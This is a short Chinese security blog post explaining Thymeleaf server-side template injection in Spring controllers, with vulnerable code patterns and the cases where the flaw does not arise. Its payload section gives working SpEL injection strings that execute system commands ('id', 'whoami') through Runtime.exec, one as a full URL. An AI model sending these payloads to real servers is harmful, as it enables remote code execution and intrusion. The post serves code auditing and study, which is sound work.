---
title: Thymeleaf模板注入
author: Creexile
date: 2025-08-22
lastMod: 2025-08-22
summary: ''
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [SSTI, Java]
---

参考文章

1. [csdn-Thymeleaf模板注入漏洞总结及修复方法（上篇）](https://blog.csdn.net/m0_71692682/article/details/130538310)
2. [先知社区-Thymeleaf Fragment 注入漏洞复现及新姿势扩展](https://xz.aliyun.com/news/9281)
3. [奇安信攻防社区-Thymeleaf SSTI](https://forum.butian.net/share/1922)

# 前置知识

在Thymeleaf中返回方式有些不同:

代码`return "welcome";`指的是返回视图名, thymeleaf会为这个名为`welcome`的视图加上默认前缀`/templates`及后缀`.html`，即最终返回的视图名就是 `/templates/welcome.html`，然后会带上我们的数据model

```java
@Controller
public class HellController {
    Logger log = LoggerFactory.getLogger(HelloController.class);
    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("message", "happy everyday");
        return "welcome";
    }
}
```

前端如下

```html
<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
  <div th:fragment="header">
    <h3>Spring Boot Web Thymeleaf Example</h3>
  </div>
  <div th:fragment="main">
    <span th:text="'Hello, '+ ${message}"></span>
  </div>
  <body>
    <h1 th:inline="text">Hello</h1>
    <p th:text="*{${message2}}"></p>
  </body>
</html>
```

这种漏洞的触发方式有三: return可控, URL路径可控, 模板内容可控

代码审计的时候根据这种特征去找

# 常见payload

```
__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::.x

http://127.0.0.1:8080/doc/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22whoami%22)%7D__::main.x
```

## return可控

接收到参数之后在return处进行了模板路径拼接

```java
@PostMapping("/getKeys2")
public String getCacheKey2(String a,String b){
    return "11" + a;
}
```

## URL路径可控

这种情况比较少见, 要求方法的返回类必须为void, 此时会从URL中获取viewname, 以URL路由为视图名称, 调用模板视图去解析

```java
@GetMapping("/test/{a}")
public void getDocument(@PathVariable String a) {
    log.info("111" + a);
}
```

## 模板内容可控

这个不太可能出现了

# 不存在漏洞的情况

1. 使用`@ResponseBody`或`@RestController`修饰
2. 使用`redirect:`或`forward:`修饰
3. 设置为`HttpServletResponse`
